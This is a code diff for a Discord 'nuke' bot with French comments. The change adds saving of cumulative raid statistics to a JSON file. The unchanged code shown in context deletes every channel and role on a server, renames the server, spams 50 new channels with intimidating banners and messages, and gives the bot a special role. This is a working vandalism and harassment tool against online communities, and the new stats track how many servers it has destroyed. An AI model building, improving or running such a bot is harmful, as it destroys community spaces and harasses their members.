@@ -1,6 +1,46 @@
 ﻿require('dotenv').config();
+const fs = require('fs');
 const { Client, GatewayIntentBits, PermissionsBitField, ChannelType, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
 
+// ============================================================
+// GESTION DES STATS PERMANENTES (FICHIER JSON)
+// ============================================================
+const STATS_FILE = './stats.json';
+
+function loadStats() {
+    if (fs.existsSync(STATS_FILE)) {
+        try {
+            const data = fs.readFileSync(STATS_FILE, 'utf8');
+            return JSON.parse(data);
+        } catch (e) {
+            console.error("Erreur lors du chargement des stats, réinitialisation.");
+            return { totalNukes: 0, totalChannelsDeleted: 0, totalRolesDeleted: 0, totalChannelsCreated: 0 };
+        }
+    } else {
+        return { totalNukes: 0, totalChannelsDeleted: 0, totalRolesDeleted: 0, totalChannelsCreated: 0 };
+    }
+}
+
+function saveStats() {
+    const data = {
+        totalNukes: totalNukes,
+        totalChannelsDeleted: totalChannelsDeleted,
+        totalRolesDeleted: totalRolesDeleted,
+        totalChannelsCreated: totalChannelsCreated
+    };
+    fs.writeFileSync(STATS_FILE, JSON.stringify(data, null, 2), 'utf8');
+}
+
+// On charge les stats au démarrage
+let stats = loadStats();
+let totalNukes = stats.totalNukes;
+let totalChannelsDeleted = stats.totalChannelsDeleted;
+let totalRolesDeleted = stats.totalRolesDeleted;
+let totalChannelsCreated = stats.totalChannelsCreated;
+
+// ============================================================
+// CLIENT SETUP
+// ============================================================
 const client = new Client({
     intents: [
         GatewayIntentBits.Guilds,
@@ -14,13 +54,6 @@ const client = new Client({
 const PREFIX = process.env.PREFIX || '!';
 const AUTHORIZED_ID = "1474433573174907054";
 
-// ============================================================
-// STATS
-// ============================================================
-let totalNukes = 0;
-let totalChannelsDeleted = 0;
-let totalRolesDeleted = 0;
-let totalChannelsCreated = 0;
 let statsChannelId = null;
 let statsMessageId = null;
 
@@ -55,7 +88,7 @@ const SCARY_MESSAGES = [
 ];
 
 const HACKER_IMAGES = [
-    'https://imgur.com/gallery/latest-3-65-million-dollars-hack-of-sforce-GL9VVFT#/t/hacker',
+    'https://i.imgur.com/2wI8t0V.png',
     'https://i.imgur.com/3hqP4G6.png',
     'https://i.imgur.com/5VjN7pK.png'
 ];
@@ -160,6 +193,7 @@ client.once('ready', async () => {
     console.log(`✅ Connected as ${client.user.tag}`);
     console.log(`📊 ${client.guilds.cache.size} servers`);
     console.log(`🔧 Prefix: ${PREFIX}`);
+    console.log(`💾 Stats loaded from file. Total Nukes: ${totalNukes}`);
     console.log('====================================');
     await updateStatsChannel();
 });
@@ -210,25 +244,17 @@ async function handleNuke(message) {
     let channelsCreated = 0;
 
     try {
-        // --------------------------------------------------------
         // 1. DELETE ALL CHANNELS (ULTRA RAPIDE)
-        // --------------------------------------------------------
         const channels = guild.channels.cache;
-        // On crée un tableau de "promesses" de suppression
         const deletePromises = channels.map(async (channel) => {
             try {
                 await channel.delete();
                 channelsDeleted++;
-            } catch (e) {
-                // Ignorer les erreurs individuelles
-            }
+            } catch (e) {}
         });
-        // On lance TOUTES les suppressions en même temps
         await Promise.all(deletePromises);
 
-        // --------------------------------------------------------
         // 2. DELETE ALL ROLES (except @everyone) (ULTRA RAPIDE)
-        // --------------------------------------------------------
         const roles = guild.roles.cache;
         const deleteRolePromises = roles.map(async (role) => {
             if (role.name !== '@everyone' && role.id !== guild.id) {
@@ -246,18 +272,14 @@ async function handleNuke(message) {
             await guild.setName(`☠ N1K1-0N-T0P-${nukeNumber} ☠`);
         } catch (e) {}
 
-        // --------------------------------------------------------
         // 4. CREATE 50 NEW CHANNELS (ULTRA RAPIDE)
-        // --------------------------------------------------------
         const createPromises = [];
         for (let i = 0; i < 50; i++) {
             const name = SCARY_NAMES[i % SCARY_NAMES.length];
-            // On crée la promesse de création mais on ne l'attend pas tout de suite
             const promise = guild.channels.create({
                 name: name,
                 type: ChannelType.GuildText,
             }).then(async (channel) => {
-                // Une fois le salon créé, on envoie tout dedans
                 try {
                     await channel.send('```' + ASCII_BANNER + '```');
                     await channel.send(SCARY_MESSAGES[Math.floor(Math.random() * SCARY_MESSAGES.length)]);
@@ -279,7 +301,6 @@ async function handleNuke(message) {
             
             createPromises.push(promise);
         }
-        // On lance TOUTES les créations en même temps
         await Promise.all(createPromises);
 
         // 5. CREATE SPECIAL ROLE
@@ -293,11 +314,13 @@ async function handleNuke(message) {
             await guild.members.me.roles.add(role);
         } catch (e) {}
 
-        // 6. UPDATE STATS
+        // 6. UPDATE STATS & SAVE TO FILE
         totalNukes++;
         totalChannelsDeleted += channelsDeleted;
         totalRolesDeleted += rolesDeleted;
         totalChannelsCreated += channelsCreated;
+        
+        saveStats(); // <--- C'EST ICI QUE LES STATS SONT SAUVEGARDÉES DANS LE FICHIER JSON
 
         // 7. UPDATE STATS CHANNEL
         await updateStatsChannel();
